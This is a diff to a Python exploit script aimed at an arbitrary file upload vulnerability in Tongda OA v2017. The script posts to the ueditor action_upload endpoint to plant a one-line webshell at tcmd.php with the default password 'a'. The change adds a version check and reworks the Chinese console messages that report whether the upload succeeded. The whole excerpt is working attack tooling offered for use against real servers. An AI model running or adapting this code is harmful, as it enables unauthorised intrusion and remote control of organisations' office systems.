@@ -54,16 +54,14 @@ submit
     upload_url=target_url+'module/ueditor/php/action_upload.php?action=uploadfile'
     exp_url=target_url+'tcmd.php'
     console.print(now_time() + " [INFO]     正在检测通达OA v2017 action_upload任意文件上传漏洞", style='bold blue')
+    url = target_url + 'inc/expired.php'
     try:
         requests.packages.urllib3.disable_warnings()
         upload = requests.post(upload_url, headers=headers, data=data, verify=False)
-        if upload.status_code == 200:
-            console.print(now_time() + ' [SUCCESS]  上传webshell成功，检测wbshell中:{}'.format(exp_url), style='bold green')
-            response=requests.get(exp_url, headers=headerx, verify=False)
-            if response.status_code == 200:
-                console.print(now_time() + ' [SUCCESS] 一句话webshell默认密码为a:{}'.format(exp_url), style='bold green')
-            else:
-                console.print(now_time() + ' [WARNING]  webshell失效了可能原因被防火墙阻拦，请手动检测:{}'.format(exp_url), style='bold red ')
+        response = requests.get(url, headers=headers, timeout=5, verify=False)
+        if upload.status_code == 200 and '2017' in response.text:
+            console.print(now_time() + ' [SUCCESS]  通达OA v2017 上传webshell成功，请手动检测wbshell 默认密码为a:', style='bold green')
+            console.print(now_time() + ' [SUCCESS]  {}'.format(exp_url), style='bold green')
         else:
             console.print(now_time() + ' [WARNING]  通达OA v2017 action_upload任意文件上传漏洞不存在', style='bold red ')
     except:
